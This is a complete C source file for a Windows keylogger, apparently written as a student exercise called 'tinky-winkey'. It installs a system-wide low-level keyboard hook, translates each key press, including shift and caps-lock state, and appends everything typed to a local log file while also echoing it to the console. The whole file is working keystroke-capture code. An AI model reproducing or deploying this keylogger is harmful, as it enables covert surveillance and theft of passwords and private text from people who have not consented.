#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment( lib, "user32.lib") 
#pragma comment( lib, "gdi32.lib")

HHOOK _hook;
HANDLE hFile; 
BOOL shiftIsHeld = FALSE;
BOOL capsLockActivated = FALSE;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;
 
 char* handleSpecialCase(DWORD vkCode)
 {
    switch (vkCode)
    {
        case VK_ESCAPE:
            return "ESC";
        case VK_RETURN:
            return "RETURN";
        case VK_TAB:
            return "TAB";
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
            return "CTRL";
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU:
            return "ALT";
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
            shiftIsHeld = TRUE;
            return "SHIFT";
        case VK_CAPITAL:
            capsLockActivated = !capsLockActivated;
            return "CAPS_LOCK";
        case VK_BACK:
            return "BACK";
    }
    return NULL;
 }

// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
        DWORD dwBytesToWrite;
        DWORD dwBytesWritten;
        BOOL bErrorFlag = FALSE;
        char keyString[20];
		// the action is valid: HC_ACTION.
        if (wParam == WM_KEYUP)
        {
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            if (kbdStruct.vkCode == VK_SHIFT || kbdStruct.vkCode == VK_LSHIFT || kbdStruct.vkCode == VK_RSHIFT)
                shiftIsHeld = FALSE;
        }
		else if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            // Special cases
            char* specialCase = handleSpecialCase(kbdStruct.vkCode);
            if (specialCase == NULL)
            {
                char c = kbdStruct.vkCode;
                BOOL useUpperCase = (shiftIsHeld && !capsLockActivated) || (!shiftIsHeld && capsLockActivated);
                if (!useUpperCase)
                {
                    c = tolower(c);
                }
                keyString[0] = c;
                keyString[1] = '\0';
            }
            else
            {
                strcpy_s(keyString, sizeof keyString, specialCase);
            }

            printf("%s", keyString);
            dwBytesToWrite = strlen(keyString);
            dwBytesWritten = 0;
            bErrorFlag = WriteFile( 
                            hFile,
                            keyString,
                            dwBytesToWrite,
                            &dwBytesWritten,
                            NULL);

            if (FALSE == bErrorFlag)
            {
                printf("Terminal failure: Unable to write to file.\n");
            }
            else
            {
                if (dwBytesWritten != dwBytesToWrite)
                {
                    printf("Error: dwBytesWritten != dwBytesToWrite\n");
                }
            }
		}
	}
 
	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}
 
void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}
}
 
void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}
 
void main()
{
    char filename[] = "c:\\Users\\Titouan\\Documents\\42\\tinky-winkey\\logs.txt";
    // Try to create file
    hFile = CreateFile(filename,      
                       GENERIC_WRITE,        
                       0,                   
                       NULL,               
                       CREATE_NEW,        
                       FILE_ATTRIBUTE_NORMAL,
                       NULL);

    // If creation failed try to edit it
    if (hFile == INVALID_HANDLE_VALUE) 
    { 
        hFile = CreateFile(filename,
                           FILE_APPEND_DATA,
                           0,              
                           NULL,          
                           OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL,
                           NULL);               
    }

    // Infinite loop listening for messages
    SetHook();
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }

    CloseHandle(hFile);
}